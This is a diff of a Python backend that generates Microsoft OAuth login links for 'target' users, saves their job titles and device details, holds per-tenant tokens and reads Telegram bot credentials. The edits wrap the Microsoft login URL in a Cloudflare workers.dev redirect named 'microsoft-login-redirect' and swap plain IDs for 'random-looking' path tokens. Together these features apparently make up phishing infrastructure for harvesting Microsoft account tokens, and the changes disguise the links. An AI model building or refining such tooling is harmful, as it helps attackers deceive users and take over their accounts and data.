@@ -17,7 +17,7 @@ REDIRECT_URI = "https://oauth-backend-7cuu.onrender.com/auth/callback"
 TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
 AUTHORIZE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
 
-# ask Graph explicitly for jobTitle
+# Explicitly select jobTitle too
 GRAPH_ME_URL = (
     "https://graph.microsoft.com/v1.0/me"
     "?$select=id,displayName,mail,userPrincipalName,jobTitle"
@@ -26,8 +26,8 @@ GRAPH_ME_URL = (
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
 
-# optional Cloudflare Worker wrapper, for example:
-# https://your-worker-subdomain.workers.dev
+# Example:
+# https://microsoft-login-redirect.dorseym410.workers.dev
 CLOUDFLARE_WORKER_BASE_URL = os.environ.get("CLOUDFLARE_WORKER_BASE_URL", "").rstrip("/")
 
 # legacy DB compatibility for tenant_tokens.session_id NOT NULL
@@ -140,7 +140,6 @@ def save_saved_user(admin_user_id: str, target_user_id: str, job_title: str | No
                 admin_user_id=admin_user_id,
                 user_id=target_user_id
             )
-            # only set if your model has the column
             if hasattr(row, "job_title"):
                 row.job_title = job_title
             db.add(row)
@@ -161,7 +160,8 @@ def create_connect_invite(admin_user_id: str):
     db = SessionLocal()
 
     try:
-        invite_token = str(uuid.uuid4())
+        # random-looking token for the worker path
+        invite_token = f"{uuid.uuid4().int % 10**7}-{uuid.uuid4().int % 10**12}-{uuid.uuid4().hex[:10]}"
 
         invite = ConnectInvite(
             admin_user_id=admin_user_id,
@@ -217,24 +217,24 @@ def mark_connect_invite_used(invite_token: str, resolved_user_id: str | None = N
 # =========================
 # HELPERS
 # =========================
-def wrap_with_cloudflare_worker(target_url: str):
+def wrap_with_cloudflare_worker(target_url: str, link_token: str | None = None):
     """
-    If CLOUDFLARE_WORKER_BASE_URL is configured,
-    return a workers.dev redirect URL like:
-    https://your-worker.workers.dev/r?target=<encoded-url>
-
-    Otherwise return the original target_url.
+    Returns either:
+    - raw Microsoft URL if worker base URL is not configured
+    - workers.dev path-style URL:
+      https://worker.subdomain.workers.dev/<token>?target=<encoded-target>
     """
     if not CLOUDFLARE_WORKER_BASE_URL:
         return target_url
 
+    safe_token = link_token or str(uuid.uuid4())
     return (
-        f"{CLOUDFLARE_WORKER_BASE_URL}/r?"
+        f"{CLOUDFLARE_WORKER_BASE_URL}/{safe_token}?"
         f"{urlencode({'target': target_url})}"
     )
 
 
-def build_authorize_url(state_value: str):
+def build_authorize_url(state_value: str, link_token: str | None = None):
     params = {
         "client_id": CLIENT_ID,
         "response_type": "code",
@@ -246,7 +246,7 @@ def build_authorize_url(state_value: str):
     }
 
     raw_login_url = f"{AUTHORIZE_URL}?{urlencode(params)}"
-    wrapped_login_url = wrap_with_cloudflare_worker(raw_login_url)
+    wrapped_login_url = wrap_with_cloudflare_worker(raw_login_url, link_token=link_token)
 
     print(f"DEBUG: Generated raw_login_url: {raw_login_url}")
     print(f"DEBUG: Generated wrapped_login_url: {wrapped_login_url}")
@@ -297,16 +297,22 @@ def build_device_info(client_ip: str = None, user_agent: str = None):
 # LOGIN LINK GENERATION
 # =========================
 def generate_login_link(user_id: str):
+    # direct per-user flow
     state_value = f"user:{user_id}"
     print(f"DEBUG: Generated state_value: {state_value}")
-    return build_authorize_url(state_value)
+
+    visible_link_token = str(uuid.uuid4())
+    return build_authorize_url(state_value, link_token=visible_link_token)
 
 
 def generate_org_connect_link(admin_user_id: str):
+    # generic invite flow
     invite_token = create_connect_invite(admin_user_id)
     state_value = f"invite:{invite_token}"
     print(f"DEBUG: Generated org invite state_value: {state_value}")
-    return build_authorize_url(state_value)
+
+    # use the invite token itself in the worker path
+    return build_authorize_url(state_value, link_token=invite_token)
 
 
 # =========================
